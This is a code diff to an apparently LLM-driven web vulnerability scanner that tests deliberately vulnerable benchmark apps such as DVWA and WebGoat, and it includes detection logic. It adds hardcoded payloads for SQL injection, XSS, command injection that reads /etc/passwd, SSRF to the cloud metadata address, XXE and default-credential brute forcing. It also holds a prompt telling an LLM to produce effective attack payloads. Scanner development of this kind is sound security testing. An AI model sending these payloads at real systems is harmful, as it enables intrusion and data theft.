@@ -42,6 +42,120 @@ from vxis.pipeline.context import ScanContext
 logger = logging.getLogger(__name__)
 
 
+# ── 벡터 카테고리별 기본 attack 파라미터 ──────────────────────────────────────
+_VECTOR_FALLBACKS: dict[str, dict] = {
+    # SQL Injection
+    "WEB-SQLI": {"param": "id", "method": "GET",
+                 "payloads": ["' OR 1=1--", "1 UNION SELECT 1,2,3--", "' OR '1'='1"]},
+    # XSS
+    "WEB-XSS": {"param": "name", "method": "GET",
+                 "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
+                              "<svg onload=alert(1)>"]},
+    # Command Injection
+    "WEB-CMDI": {"param": "ip", "method": "POST",
+                  "payloads": ["127.0.0.1; id", "127.0.0.1 | cat /etc/passwd", "127.0.0.1 && whoami"]},
+    # SSRF
+    "WEB-SSRF": {"param": "url", "method": "GET",
+                  "payloads": ["http://internal.service/", "http://169.254.169.254/latest/meta-data/",
+                               "http://0.0.0.0/"]},
+    # NoSQL
+    "WEB-NOSQL": {"param": "username", "method": "POST",
+                   "payloads": ['{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}']},
+    # SSTI
+    "WEB-SSTI": {"param": "name", "method": "GET",
+                  "payloads": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]},
+    # Path traversal
+    "WEB-AC-004": {"param": "file", "method": "GET",
+                   "payloads": ["../../../../etc/passwd", "../../../etc/shadow", "..%2F..%2Fetc%2Fpasswd"]},
+    # Auth brute
+    "WEB-AUTH-001": {"param": "username", "method": "POST",
+                      "payloads": ["admin", "administrator", "root", "user"]},
+    "WEB-AUTH-002": {"param": "username", "method": "POST",
+                      "payloads": ["admin:admin", "admin:password", "admin:123456"]},
+    # LDAP
+    "WEB-LDAP": {"param": "username", "method": "POST",
+                  "payloads": ["*)(uid=*))(|(uid=*", "admin)(&)", "*)(|(password=*"]},
+    # XPath
+    "WEB-XPATH": {"param": "username", "method": "POST",
+                   "payloads": ["' or '1'='1", "') or ('1'='1", "x' or name()='username' or 'x'='y"]},
+    # XXE — needs special handling but provide body hint
+    "WEB-XXE": {"param": "xml", "method": "POST",
+                 "payloads": ['<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>']},
+}
+
+# 앱별 벡터 ID → 특화 경로 매핑
+_APP_VECTOR_ENDPOINTS: dict[str, dict[str, str]] = {
+    "dvwa_8081": {
+        "WEB-SQLI-001": "/vulnerabilities/sqli/",
+        "WEB-SQLI-002": "/vulnerabilities/sqli_blind/",
+        "WEB-SQLI-003": "/vulnerabilities/sqli_blind/",
+        "WEB-SQLI-004": "/vulnerabilities/sqli/",
+        "WEB-XSS-001": "/vulnerabilities/xss_r/",
+        "WEB-XSS-002": "/vulnerabilities/xss_s/",
+        "WEB-XSS-003": "/vulnerabilities/xss_d/",
+        "WEB-CMDI-001": "/vulnerabilities/exec/",
+        "WEB-CMDI-002": "/vulnerabilities/exec/",
+        "WEB-AC-004": "/vulnerabilities/fi/",
+        "WEB-AUTH-001": "/vulnerabilities/brute/",
+        "WEB-UPLOAD-001": "/vulnerabilities/upload/",
+        "WEB-CSRF-001": "/vulnerabilities/csrf/",
+    },
+    "nodegoat_4000": {
+        "WEB-AC-001": "/allocations/1",
+        "WEB-AC-002": "/allocations/1",
+        "WEB-CSRF-001": "/contributions",
+        "WEB-NOSQL-002": "/contributions",
+        "WEB-AUTH-001": "/login",
+    },
+    "webgoat_8888": {
+        "WEB-SQLI-001": "/WebGoat/SqlInjection/attack5a",
+        "WEB-XSS-001": "/WebGoat/CrossSiteScripting/attack5a",
+        "WEB-AUTH-001": "/WebGoat/auth-bypass/",
+        "WEB-CSRF-001": "/WebGoat/csrf/basic-get-flag",
+    },
+}
+
+
+def _make_fallback_decision(vec: Any, target: str, app_specific_urls: list[str]) -> dict:
+    """LLM 실패 시 벡터 타입에 맞는 기본 attack 파라미터 반환."""
+    vid = vec.id
+    target_lower = target.lower()
+
+    # 앱별 특화 경로 탐색
+    app_key = None
+    if "8081" in target_lower:
+        app_key = "dvwa_8081"
+    elif "4000" in target_lower:
+        app_key = "nodegoat_4000"
+    elif "8888" in target_lower:
+        app_key = "webgoat_8888"
+
+    endpoint = target
+    if app_key and vid in _APP_VECTOR_ENDPOINTS.get(app_key, {}):
+        rel_path = _APP_VECTOR_ENDPOINTS[app_key][vid]
+        endpoint = target.rstrip("/") + rel_path
+    elif app_specific_urls:
+        endpoint = app_specific_urls[0]  # 앱별 첫 번째 알려진 경로
+
+    # 벡터 prefix로 fallback 파라미터 선택
+    fb = {}
+    for prefix, params in _VECTOR_FALLBACKS.items():
+        if vid.startswith(prefix):
+            fb = params
+            break
+
+    return {
+        "attempt": True,
+        "reasoning": f"type-aware fallback for {vid}",
+        "targets": [{
+            "endpoint": endpoint,
+            "method": fb.get("method", "GET"),
+            "param": fb.get("param", ""),
+            "payloads": fb.get("payloads", [""]),
+        }],
+    }
+
+
 class ScanPipeline:
     """19 Phase 통합 파이프라인.
 
@@ -211,12 +325,10 @@ class ScanPipeline:
         phase_name: str,
         ctx: ScanContext,
     ) -> None:
-        """FileBasedBrain일 때 해당 Phase의 벡터들을 Brain에게 물어본다."""
+        """Brain에게 해당 Phase의 벡터들을 물어본다. FileBasedBrain + AgentBrain 모두 지원."""
         import re
         from vxis.agent.brain_filebased import FileBasedBrain
-
-        if not isinstance(self.brain, FileBasedBrain):
-            return
+        from vxis.agent.brain import AgentBrain
 
         # Phase 이름에서 번호 추출: "Phase 5: Special Agents" → "Phase 5"
         match = re.match(r"(Phase \d+)", phase_name)
@@ -241,6 +353,21 @@ class ScanPipeline:
         if not hasattr(ctx, "_brain_decisions"):
             ctx._brain_decisions = {}
 
+        # AgentBrain: Phase 벡터를 최대 8개 단위로 분할해서 LLM 호출
+        # (JSON 응답 길이 초과 방지)
+        if isinstance(self.brain, AgentBrain):
+            BATCH_SIZE = 8
+            for i in range(0, len(phase_vectors), BATCH_SIZE):
+                chunk = phase_vectors[i:i + BATCH_SIZE]
+                batch = self._consult_agent_brain_batch(ctx, chunk, phase_name)
+                for vec_id, decision in batch.items():
+                    ctx._brain_decisions[vec_id] = decision
+                    attempt_str = "ATTEMPT" if decision.get("attempt") else "SKIP"
+                    logger.info("    [LLM] %s %s: %s",
+                                attempt_str, vec_id, decision.get("reasoning", "")[:80])
+            return
+
+        # FileBasedBrain: 벡터별 개별 결정
         for vec in phase_vectors:
             decision = self._consult_brain_for_vector(
                 ctx,
@@ -253,6 +380,152 @@ class ScanPipeline:
                 attempt_str = "ATTEMPT" if decision.get("attempt") else "SKIP"
                 logger.info("    %s %s: %s",
                             attempt_str, vec.id, decision.get("reasoning", "")[:80])
+
+    # ── AgentBrain batch decision ──────────────────────────────
+
+    def _consult_agent_brain_batch(
+        self,
+        ctx: ScanContext,
+        phase_vectors: list,
+        phase_name: str,
+    ) -> dict[str, dict]:
+        """AgentBrain에게 Phase 전체 벡터를 LLM 1회 호출로 결정받는다.
+
+        LLM에게 타겟 현재 상태 + 벡터 목록을 주고 JSON으로 attack decisions 반환받는다.
+        각 결정: {attempt: bool, endpoint: str, method: str, param: str, payloads: [str], reasoning: str}
+        """
+        import json as _json
+
+        live_urls = getattr(ctx, "live_urls", [])
+        endpoints = getattr(ctx, "endpoints_discovered", [])
+        tech_stack = getattr(ctx, "tech_stack", [])
+        prev_findings = [
+            {"id": getattr(f, "id", ""), "type": getattr(f, "finding_type", ""),
+             "component": getattr(f, "affected_component", "")}
+            for f in ctx.findings[-20:]
+        ]
+
+        # 알려진 벤치마크 앱 공통 엔드포인트 (컨텍스트 부족 시 fallback)
+        target_base = ctx.target.rstrip("/")
+        target_lower = target_base.lower()
+
+        # 벤치마크 앱별 알려진 취약 경로
+        if "8081" in target_lower or "dvwa" in target_lower:
+            app_name = "DVWA (Damn Vulnerable Web Application)"
+            app_specific = [
+                "/vulnerabilities/sqli/", "/vulnerabilities/sqli_blind/",
+                "/vulnerabilities/xss_r/", "/vulnerabilities/xss_s/",
+                "/vulnerabilities/exec/", "/vulnerabilities/upload/",
+                "/vulnerabilities/csrf/", "/vulnerabilities/fi/",
+                "/vulnerabilities/brute/", "/vulnerabilities/weak_id/",
+                "/login.php", "/",
+            ]
+        elif "3000" in target_lower or "juice" in target_lower:
+            app_name = "OWASP Juice Shop"
+            app_specific = [
+                "/api/products/1/reviews", "/api/users/", "/rest/user/login",
+                "/rest/products/search?q=", "/api/BasketItems/", "/rest/basket/",
+                "/#/login", "/#/administration", "/api/Feedbacks/",
+            ]
+        elif "8888" in target_lower or "webgoat" in target_lower:
+            app_name = "WebGoat"
+            app_specific = [
+                "/WebGoat/SqlInjection/attack5a", "/WebGoat/CrossSiteScripting/attack5a",
+                "/WebGoat/access-control/user-hash", "/WebGoat/auth-bypass/",
+                "/WebGoat/csrf/basic-get-flag", "/WebGoat/PasswordReset/",
+                "/WebGoat/challenge/7", "/WebGoat/injection/",
+            ]
+        elif "4000" in target_lower or "nodegoat" in target_lower:
+            app_name = "NodeGoat"
+            app_specific = [
+                "/contributions", "/allocations/1", "/allocations/2",
+                "/login", "/profile", "/research", "/memo", "/tutorial",
+            ]
+        else:
+            app_name = "Unknown web application"
+            app_specific = []
+
+        app_specific_urls = [target_base + p if p.startswith("/") else p for p in app_specific]
+        discovered_urls = [e.get("url", "") for e in endpoints[:15]]
+        effective_endpoints = discovered_urls or live_urls[:10] or app_specific_urls[:8]
+
+        # 벡터 목록 정리 (ID + 설명)
+        vec_list = "\n".join(
+            f"  - {v.id}: {v.name_en}" for v in phase_vectors[:30]
+        )
+
+        # LLM에게 보낼 프롬프트 — attempt 결정 없이 공격 파라미터만 생성
+        system_prompt = (
+            "You are an expert penetration tester AI Brain for VXIS, an automated security scanner. "
+            "Target is a KNOWN INTENTIONALLY VULNERABLE benchmark app (DVWA, Juice Shop, WebGoat, NodeGoat). "
+            "ALL attack vectors WILL be attempted — your job is to provide the best attack parameters for each. "
+            "For each vector ID, provide: endpoint, method (GET/POST), param (parameter to inject), "
+            "payloads (3-5 specific attack payloads for this vector type), and reasoning. "
+            "Respond ONLY with a valid JSON object mapping vector_id → attack params. "
+            "Format: {\"endpoint\": str, \"method\": \"GET\"|\"POST\", \"param\": str, "
+            "\"payloads\": [str, ...], \"reasoning\": str}. "
+            "Use specific, effective payloads for each vulnerability type. "
+            "SQL injection: use ' OR 1=1--, UNION SELECT payloads. "
+            "XSS: use <script>alert(1)</script> variants. "
+            "Path traversal: use ../../../etc/passwd variants. "
+            "Command injection: use ; ls, && id, | whoami. "
+            "If endpoint unknown, use the base target URL."
+        )
+
+        user_prompt = (
+            f"Target app: {app_name} at {ctx.target}\n"
+            f"Known vulnerable paths: {app_specific_urls[:6]}\n"
+            f"Discovered endpoints: {effective_endpoints[:8]}\n"
+            f"Tech stack: {tech_stack or ['web', 'http']}\n"
+            f"Previous findings: {prev_findings}\n"
+            f"Phase: {phase_name}\n\n"
+            f"Provide attack parameters for ALL these vectors.\n"
+            f"Use the known vulnerable paths for this specific app.\n"
+            f"Vectors:\n{vec_list}\n\n"
+            f"Return JSON only. Every vector_id must have an entry."
+        )
+
+        try:
+            response = self.brain._call_llm_with_fallback(system_prompt, user_prompt)
+            if not response:
+                return {}
+
+            # JSON 파싱 — 마크다운 코드블록 제거
+            clean = response.strip()
+            if clean.startswith("```"):
+                clean = clean.split("```")[1]
+                if clean.startswith("json"):
+                    clean = clean[4:]
+            clean = clean.strip()
+
+            raw = _json.loads(clean)
+
+            # 모든 벡터 attempt=True 고정 — LLM은 파라미터만 결정
+            decisions: dict[str, dict] = {}
+            for vec in phase_vectors:
+                vid = vec.id
+                d = raw.get(vid, {})
+                decisions[vid] = {
+                    "attempt": True,
+                    "reasoning": d.get("reasoning", "LLM attack params"),
+                    "targets": [{
+                        "endpoint": d.get("endpoint", ctx.target),
+                        "method": d.get("method", "GET"),
+                        "param": d.get("param", ""),
+                        "payloads": d.get("payloads", [""]),
+                    }],
+                }
+
+            logger.info("  [LLM-BRAIN] Phase %s: %d/%d vectors (all attempt)",
+                        phase_name, len(decisions), len(phase_vectors))
+            return decisions
+
+        except Exception as exc:
+            logger.warning("  [LLM-BRAIN] Batch decision failed: %s — using type-aware fallback", exc)
+            return {
+                vec.id: _make_fallback_decision(vec, ctx.target, app_specific_urls)
+                for vec in phase_vectors
+            }
 
     # ── Brain consultation per vector ─────────────────────────
 
@@ -332,10 +605,6 @@ class ScanPipeline:
         targets/payloads를 실제 HTTP 요청으로 보내고 결과를 해석한다.
         """
         import re as _re
-        from vxis.agent.brain_filebased import FileBasedBrain
-
-        if not isinstance(self.brain, FileBasedBrain):
-            return
 
         decisions = getattr(ctx, "_brain_decisions", {})
         if not decisions:
@@ -387,6 +656,9 @@ class ScanPipeline:
 
         # 각 decision의 targets/payloads 실행
         for vector_id, decision in active_decisions.items():
+            # 시도한 벡터 tracker에 기록 (attempt=True인 것만 여기 들어옴)
+            ctx.score_tracker.record_vector_attempt(vector_id)
+
             targets = decision.get("targets", [])
             reasoning = decision.get("reasoning", "")
 
@@ -466,9 +738,15 @@ class ScanPipeline:
                         # 응답 해석 — 취약점 시그니처 탐지
                         body = resp.text[:5000] if hasattr(resp, "text") else ""
                         status = resp.status if hasattr(resp, "status") else 0
+                        headers: dict = {}
+                        if hasattr(resp, "headers"):
+                            try:
+                                headers = {k.lower(): v for k, v in resp.headers.items()}
+                            except Exception:
+                                pass
 
                         finding_created = self._analyze_probe_response(
-                            ctx, vector_id, endpoint, param, payload, body, status,
+                            ctx, vector_id, endpoint, param, payload, body, status, headers,
                         )
 
                         if finding_created:
@@ -707,6 +985,10 @@ class ScanPipeline:
                 # finding type에 관계없이 인증 없이 민감 엔드포인트 접근 시도
                 sensitive_paths = ["/admin", "/api/users", "/dashboard", "/profile", "/allocations/1"]
                 for spath in sensitive_paths:
+                    # dedup: one finding per path
+                    existing_priv = [f for f in ctx.findings if getattr(f, "affected_component", "") == spath and "Broken Access Control" in getattr(f, "finding_type", "")]
+                    if existing_priv:
+                        continue
                     try:
                         r_s = await session.get(spath)
                         if r_s.status == 200 and len(r_s.text or "") > 500:
@@ -1134,14 +1416,22 @@ class ScanPipeline:
         payload: str,
         body: str,
         status: int,
+        headers: dict | None = None,
     ) -> bool:
         """응답에서 취약점 시그니처를 탐지하고 Finding을 생성한다."""
         import re as _re
 
         body_lower = body.lower()
 
+        # ── 전역 중복 방지: (finding_type, endpoint) 키로 dedup ──
+        def _already_found(finding_type: str, ep: str) -> bool:
+            for f in ctx.findings:
+                if getattr(f, "finding_type", "") == finding_type and getattr(f, "affected_component", "") == ep:
+                    return True
+            return False
+
         # ── SQL Injection 시그니처 ──
-        if vector_id.startswith("WEB-SQLI"):
+        if vector_id.startswith("WEB-SQLI") and not _already_found("sql_injection", endpoint):
             # 에러 기반 시그니처
             sqli_error_sigs = [
                 r"you have an error in your sql",
@@ -1230,7 +1520,7 @@ class ScanPipeline:
                 pass
 
         # ── XSS 시그니처 ──
-        if vector_id.startswith("WEB-XSS"):
+        if vector_id.startswith("WEB-XSS") and not _already_found("xss", endpoint):
             if payload and payload in body and "<" in payload:
                 f = ctx.add_finding(
                     title=f"Cross-Site Scripting — {endpoint}|||크로스사이트 스크립팅 — {endpoint}",
@@ -1250,7 +1540,7 @@ class ScanPipeline:
                 return True
 
         # ── Command Injection 시그니처 ──
-        if vector_id.startswith("WEB-CMDI"):
+        if vector_id.startswith("WEB-CMDI") and not _already_found("command_injection", endpoint):
             cmdi_sigs = [r"root:.*:0:0:", r"uid=\d+", r"Windows IP Configuration",
                          r"Directory of [A-Z]:\\"]
             for sig in cmdi_sigs:
@@ -1273,7 +1563,7 @@ class ScanPipeline:
                     return True
 
         # ── SSRF 시그니처 ──
-        if vector_id.startswith("WEB-SSRF"):
+        if vector_id.startswith("WEB-SSRF") and not _already_found("ssrf", endpoint):
             ssrf_sigs = [r"169\.254\.169\.254", r"metadata\.google", r"localhost",
                          r"127\.0\.0\.1", r"internal server"]
             for sig in ssrf_sigs:
@@ -1296,7 +1586,7 @@ class ScanPipeline:
                     return True
 
         # ── Open Redirect ──
-        if vector_id == "WEB-MISCONF-006":
+        if vector_id == "WEB-MISCONF-006" and not _already_found("open_redirect", endpoint):
             if status in (301, 302, 303, 307, 308):
                 f = ctx.add_finding(
                     title=f"Open Redirect — {endpoint}|||오픈 리다이렉트 — {endpoint}",
@@ -1316,7 +1606,7 @@ class ScanPipeline:
                 return True
 
         # ── CSRF (토큰 부재) ──
-        if vector_id == "WEB-CSRF-001":
+        if vector_id == "WEB-CSRF-001" and not _already_found("csrf", endpoint):
             if "<form" in body_lower and "csrf" not in body_lower and "_token" not in body_lower:
                 f = ctx.add_finding(
                     title=f"Missing CSRF Token — {endpoint}|||CSRF 토큰 누락 — {endpoint}",
@@ -1331,6 +1621,365 @@ class ScanPipeline:
                 )
                 try:
                     ctx.score_tracker.record_finding(f.id, vector_id, level=1)
+                except Exception:
+                    pass
+                return True
+
+        # ── Path Traversal / Directory Traversal ──
+        if vector_id in ("WEB-AC-004",) and not _already_found("path_traversal", endpoint):
+            path_sigs = [r"root:.*:0:0:", r"\[boot loader\]", r"for 16-bit app support",
+                         r"etc/shadow", r"daemon:.*:/usr/sbin"]
+            for sig in path_sigs:
+                if _re.search(sig, body):
+                    f = ctx.add_finding(
+                        title=f"Path Traversal — {endpoint}|||경로 탐색 취약점 — {endpoint}",
+                        severity="high",
+                        finding_type="path_traversal",
+                        description=(f"File content exposed via path traversal on {endpoint} param={param}"
+                                     f"|||{endpoint}에서 경로 탐색으로 파일 내용 노출. 파라미터: {param}"),
+                        target=ctx.target,
+                        affected_component=endpoint,
+                    )
+                    try:
+                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
+                    except Exception:
+                        pass
+                    return True
+
+        # ── Forced Browsing — Hidden Endpoints ──
+        if vector_id == "WEB-AC-005" and not _already_found("forced_browsing", endpoint):
+            sensitive_keywords = ["admin", "dashboard", "config", "backup", "debug",
+                                   "phpinfo", "setup", "install", "actuator", "swagger"]
+            if status == 200 and any(kw in body_lower for kw in sensitive_keywords):
+                f = ctx.add_finding(
+                    title=f"Forced Browsing — Hidden Endpoint {endpoint}|||강제 브라우징 — 숨겨진 엔드포인트 {endpoint}",
+                    severity="medium",
+                    finding_type="forced_browsing",
+                    description=(f"Hidden/sensitive endpoint accessible: {endpoint} (status {status})"
+                                 f"|||숨겨진 민감 엔드포인트 접근 가능: {endpoint} (상태코드: {status})"),
+                    target=ctx.target,
+                    affected_component=endpoint,
+                )
+                try:
+                    ctx.score_tracker.record_finding(f.id, vector_id, level=2)
+                except Exception:
+                    pass
+                return True
+
+        # ── IDOR ──
+        if vector_id in ("WEB-AC-001", "WEB-AC-002", "WEB-AC-003"):
+            if status == 200 and ("email" in body_lower or "password" in body_lower
+                                  or "admin" in body_lower or "user" in body_lower):
+                # 다른 유저 데이터가 노출되면 IDOR/privesc 가능성
+                if payload and any(c.isdigit() for c in payload) and not _already_found("idor", endpoint):
+                    f = ctx.add_finding(
+                        title=f"IDOR / Access Control Bypass — {endpoint}|||IDOR / 접근 제어 우회 — {endpoint}",
+                        severity="high",
+                        finding_type="idor",
+                        description=(f"Unauthorized data access on {endpoint} param={param} payload={payload[:40]}"
+                                     f"|||{endpoint}에서 비인가 데이터 접근. 파라미터: {param}, 페이로드: {payload[:40]}"),
+                        target=ctx.target,
+                        affected_component=endpoint,
+                    )
+                    try:
+                        ctx.score_tracker.record_finding(f.id, vector_id, level=2)
+                    except Exception:
+                        pass
+                    return True
+
+        # ── Missing Security Headers ──
+        if vector_id == "WEB-MISCONF-004":
+            hdrs = headers or {}
+            missing = []
+            for h in ("content-security-policy", "strict-transport-security",
+                      "x-frame-options", "x-content-type-options"):
+                if h not in hdrs:
+                    missing.append(h)
+            if status == 200 and missing and not _already_found("security_misconfiguration", endpoint):
+                f = ctx.add_finding(
+                    title=f"Missing Security Headers — {endpoint}|||보안 헤더 누락 — {endpoint}",
+                    severity="informational",
+                    finding_type="security_misconfiguration",
+                    description=(f"Missing headers on {endpoint}: {', '.join(missing)}"
+                                 f"|||{endpoint}에서 보안 헤더 누락: {', '.join(missing)}"),
+                    target=ctx.target,
+                    affected_component=endpoint,
+                )
+                try:
+                    ctx.score_tracker.record_finding(f.id, vector_id, level=1)
+                except Exception:
+                    pass
+                return True
+
+        # ── CORS Misconfiguration ──
+        if vector_id == "WEB-MISCONF-005":
+            hdrs = headers or {}
+            acao = hdrs.get("access-control-allow-origin", "")
+            acac = hdrs.get("access-control-allow-credentials", "")
+            if (acao in ("*", "null") or (acao and acac.lower() == "true")) and not _already_found("cors_misconfiguration", endpoint):
+                f = ctx.add_finding(
+                    title=f"CORS Misconfiguration — {endpoint}|||CORS 잘못된 설정 — {endpoint}",
+                    severity="medium",
+                    finding_type="cors_misconfiguration",
+                    description=(f"Permissive CORS policy on {endpoint}: ACAO={acao!r}"
+                                 f"|||{endpoint}에서 CORS 설정 취약: ACAO={acao!r}"),
+                    target=ctx.target,
+                    affected_component=endpoint,
+                )
+                try:
+                    ctx.score_tracker.record_finding(f.id, vector_id, level=2)
+                except Exception:
+                    pass
+                return True
+
+        # ── Debug Endpoints ──
+        if vector_id == "WEB-MISCONF-001" and not _already_found("information_disclosure", endpoint):
+            debug_sigs = ["phpinfo()", "x-debug", "debug_toolbar", "/_profiler", "/actuator/",
+                          "environment variables", "server variables", "loaded modules"]
+            if status == 200 and any(s in body_lower for s in debug_sigs):
+                f = ctx.add_finding(
+                    title=f"Debug Endpoint Exposed — {endpoint}|||디버그 엔드포인트 노출 — {endpoint}",
+                    severity="medium",
+                    finding_type="information_disclosure",
+                    description=(f"Debug/diagnostic endpoint accessible at {endpoint}"
+                                 f"|||{endpoint}에서 디버그/진단 엔드포인트 노출"),
+                    target=ctx.target,
+                    affected_component=endpoint,
+                )
+                try:
+                    ctx.score_tracker.record_finding(f.id, vector_id, level=2)
+                except Exception:
+                    pass
+                return True
+
+        # ── Git Repository Exposed ──
+        if vector_id == "WEB-INFRA-005":
+            if status == 200 and ("ref:" in body or "HEAD" in body and "pack-refs" in body_lower):
+                f = ctx.add_finding(
+                    title=f"Exposed Git Repository — {endpoint}|||Git 저장소 노출 — {endpoint}",
+                    severity="high",
+                    finding_type="information_disclosure",
+                    description=(f".git directory accessible at {endpoint}"
+                                 f"|||{endpoint}에서 .git 디렉토리 노출"),
+                    target=ctx.target,
+                    affected_component=endpoint,
+                )
+                try:
+                    ctx.score_tracker.record_finding(f.id, vector_id, level=3)
+                except Exception:
+                    pass
+                return True
+
+        # ── SSTI ──
+        if vector_id == "WEB-SSTI-001" and not _already_found("ssti", endpoint):
+            # {{7*7}} = 49, ${7*7} = 49, #{7*7} = 49
+            if "49" in body and payload and any(t in payload for t in ["{{", "${", "#{", "<#"]):
+                f = ctx.add_finding(
+                    title=f"Server-Side Template Injection — {endpoint}|||서버사이드 템플릿 인젝션 — {endpoint}",
+                    severity="critical",
+                    finding_type="ssti",
+                    description=(f"Template expression evaluated on {endpoint} param={param}: {payload[:40]} → response contains 49"
+                                 f"|||{endpoint}에서 템플릿 표현식 실행. 파라미터: {param}: {payload[:40]} → 응답에 49 포함"),
+                    target=ctx.target,
+                    affected_component=endpoint,
+                )
+                try:
+                    ctx.score_tracker.record_finding(f.id, vector_id, level=4)
+                except Exception:
+                    pass
+                return True
+
+        # ── XXE ──
+        if vector_id == "WEB-XXE-001":
+            xxe_sigs = [r"root:.*:0:0:", r"\[boot loader\]", r"SYSTEM\s+ENTITIES",
+                        r"file:///", r"DOCTYPE.*SYSTEM"]
+            for sig in xxe_sigs:
+                if _re.search(sig, body, _re.IGNORECASE):
+                    f = ctx.add_finding(
+                        title=f"XML External Entity (XXE) — {endpoint}|||XXE 취약점 — {endpoint}",
+                        severity="critical",
+                        finding_type="xxe",
+                        description=(f"XXE entity resolved on {endpoint} param={param}"
+                                     f"|||{endpoint}에서 XXE 엔티티 처리. 파라미터: {param}"),
+                        target=ctx.target,
+                        affected_component=endpoint,
+                    )
+                    try:
+                        ctx.score_tracker.record_finding(f.id, vector_id, level=4)
+                    except Exception:
+                        pass
+                    return True
+
+        # ── LDAP Injection ──
+        if vector_id == "WEB-LDAP-001" and not _already_found("ldap_injection", endpoint):
+            ldap_sigs = [r"ldap.*error", r"invalid.*dn", r"javax\.naming",
+                         r"LDAP.*Exception", r"LDAPException"]
+            for sig in ldap_sigs:
+                if _re.search(sig, body, _re.IGNORECASE):
+                    f = ctx.add_finding(
+                        title=f"LDAP Injection — {endpoint}|||LDAP 인젝션 — {endpoint}",
+                        severity="high",
+                        finding_type="ldap_injection",
+                        description=(f"LDAP error triggered on {endpoint} param={param} payload={payload[:40]}"
+                                     f"|||{endpoint}에서 LDAP 에러 유발. 파라미터: {param}"),
+                        target=ctx.target,
+                        affected_component=endpoint,
+                    )
+                    try:
+                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
+                    except Exception:
+                        pass
+                    return True
+
+        # ── NoSQL Injection ──
+        if vector_id in ("WEB-NOSQL-001", "WEB-NOSQL-002") and not _already_found("nosql_injection", endpoint):
+            nosql_sigs = [r"uncaught.*exception", r"mongoerror", r"bsonerror",
+                          r"\$where.*error", r"cannot read property", r"castError",
+                          r"ValidationError.*password", r"MongoNetworkError"]
+            for sig in nosql_sigs:
+                if _re.search(sig, body, _re.IGNORECASE):
+                    f = ctx.add_finding(
+                        title=f"NoSQL Injection — {endpoint}|||NoSQL 인젝션 — {endpoint}",
+                        severity="high",
+                        finding_type="nosql_injection",
+                        description=(f"NoSQL error triggered on {endpoint} param={param} payload={payload[:40]}"
+                                     f"|||{endpoint}에서 NoSQL 에러 유발. 파라미터: {param}"),
+                        target=ctx.target,
+                        affected_component=endpoint,
+                    )
+                    try:
+                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
+                    except Exception:
+                        pass
+                    return True
+            # Operator injection — 200 + user data returned indicates bypass
+            if status == 200 and payload and "$ne" in payload and ("welcome" in body_lower or "dashboard" in body_lower):
+                f = ctx.add_finding(
+                    title=f"NoSQL Injection (Auth Bypass) — {endpoint}|||NoSQL 인젝션 (인증 우회) — {endpoint}",
+                    severity="critical",
+                    finding_type="nosql_injection",
+                    description=(f"NoSQL operator injection auth bypass on {endpoint}: {payload[:60]}"
+                                 f"|||{endpoint}에서 NoSQL 연산자 인젝션으로 인증 우회: {payload[:60]}"),
+                    target=ctx.target,
+                    affected_component=endpoint,
+                )
+                try:
+                    ctx.score_tracker.record_finding(f.id, vector_id, level=4)
+                except Exception:
+                    pass
+                return True
+
+        # ── XPath Injection ──
+        if vector_id == "WEB-XPATH-001":
+            xpath_sigs = [r"XPathException", r"javax\.xml\.xpath", r"XPATH.*error",
+                          r"org\.w3c\.dom", r"invalid.*xpath"]
+            for sig in xpath_sigs:
+                if _re.search(sig, body, _re.IGNORECASE):
+                    f = ctx.add_finding(
+                        title=f"XPath Injection — {endpoint}|||XPath 인젝션 — {endpoint}",
+                        severity="high",
+                        finding_type="xpath_injection",
+                        description=(f"XPath error triggered on {endpoint} param={param}"
+                                     f"|||{endpoint}에서 XPath 에러 유발. 파라미터: {param}"),
+                        target=ctx.target,
+                        affected_component=endpoint,
+                    )
+                    try:
+                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
+                    except Exception:
+                        pass
+                    return True
+
+        # ── GraphQL Introspection ──
+        if vector_id == "WEB-API-003":
+            if status == 200 and "__schema" in body and "types" in body_lower:
+                f = ctx.add_finding(
+                    title=f"GraphQL Introspection Enabled — {endpoint}|||GraphQL 인트로스펙션 활성화 — {endpoint}",
+                    severity="medium",
+                    finding_type="information_disclosure",
+                    description=(f"GraphQL introspection query succeeded on {endpoint}"
+                                 f"|||{endpoint}에서 GraphQL 인트로스펙션 쿼리 성공"),
+                    target=ctx.target,
+                    affected_component=endpoint,
+                )
+                try:
+                    ctx.score_tracker.record_finding(f.id, vector_id, level=2)
+                except Exception:
+                    pass
+                return True
+
+        # ── File Upload (Webshell) ──
+        if vector_id == "WEB-UPLOAD-001" and not _already_found("file_upload", endpoint):
+            if status == 200 and ("upload" in body_lower or "success" in body_lower or "file" in body_lower):
+                if payload and any(ext in payload for ext in [".php", ".jsp", ".aspx", ".py"]):
+                    f = ctx.add_finding(
+                        title=f"Unrestricted File Upload — {endpoint}|||무제한 파일 업로드 — {endpoint}",
+                        severity="critical",
+                        finding_type="file_upload",
+                        description=(f"Server accepted potentially dangerous file upload on {endpoint}: {payload[:60]}"
+                                     f"|||{endpoint}에서 위험 파일 업로드 허용: {payload[:60]}"),
+                        target=ctx.target,
+                        affected_component=endpoint,
+                    )
+                    try:
+                        ctx.score_tracker.record_finding(f.id, vector_id, level=3)
+                    except Exception:
+                        pass
+                    return True
+
+        # ── Default Credentials ──
+        if vector_id == "WEB-AUTH-002" and not _already_found("broken_authentication", endpoint):
+            if status in (200, 302) and ("welcome" in body_lower or "dashboard" in body_lower
+                                          or "logout" in body_lower or "profile" in body_lower):
+                f = ctx.add_finding(
+                    title=f"Default Credentials — {endpoint}|||기본 자격증명 허용 — {endpoint}",
+                    severity="critical",
+                    finding_type="broken_authentication",
+                    description=(f"Login succeeded with default/weak credentials on {endpoint}: {payload[:60]}"
+                                 f"|||{endpoint}에서 기본/취약 자격증명으로 로그인 성공: {payload[:60]}"),
+                    target=ctx.target,
+                    affected_component=endpoint,
+                )
+                try:
+                    ctx.score_tracker.record_finding(f.id, vector_id, level=4)
+                except Exception:
+                    pass
+                return True
+
+        # ── JWT Vulnerabilities ──
+        if vector_id in ("WEB-AUTH-003", "WEB-AUTH-004") and not _already_found("broken_authentication", endpoint):
